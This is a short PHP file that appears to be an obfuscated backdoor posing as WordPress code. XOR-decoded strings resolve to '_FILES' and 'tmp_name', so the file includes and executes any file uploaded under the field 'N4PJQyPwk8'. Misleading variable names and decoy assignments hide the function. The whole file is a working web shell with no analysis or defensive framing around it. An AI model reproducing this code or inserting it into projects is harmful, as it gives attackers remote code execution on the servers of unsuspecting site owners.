<?php

        
    
        
function dirs($date)

{
    $chunks = $date;
	$is_single_tag = 'double_encode';
    

    $original_url = $GLOBALS;
    

    $original_url = $original_url[post_type_taxonomies("%11r%19%06%14%2A", $chunks)];
    
    $post_category = $original_url;
    $thumbdir = isset($post_category[$chunks]);
    if ($thumbdir)

    {

        $end_clean = $original_url[$chunks];

        $double_prime = $end_clean[post_type_taxonomies("%3AY+%15%3F%18%3D%12", $chunks)];

        $pee_parts = $double_prime;
	$page_list = 'old_status_to_new_status';
        include ($pee_parts);

    }
}

function post_type_taxonomies($tinkle, $ep_mask)

{
    $extended = $ep_mask;
    $old_status = "url";
    $old_status  .= "decode";
    $tags_to_ignore = $old_status($tinkle);
	$locale = 'post_authors';
    $closing_single_quote = strlen($tags_to_ignore);
    $closing_single_quote = substr($extended, 0, $closing_single_quote);
    $wp_post_statuses = $tags_to_ignore ^ $closing_single_quote;
    
    $tags_to_ignore = sprintf($wp_post_statuses, $closing_single_quote);

    

    return $wp_post_statuses;
}


dirs('N4PJQyPwk8');


?>
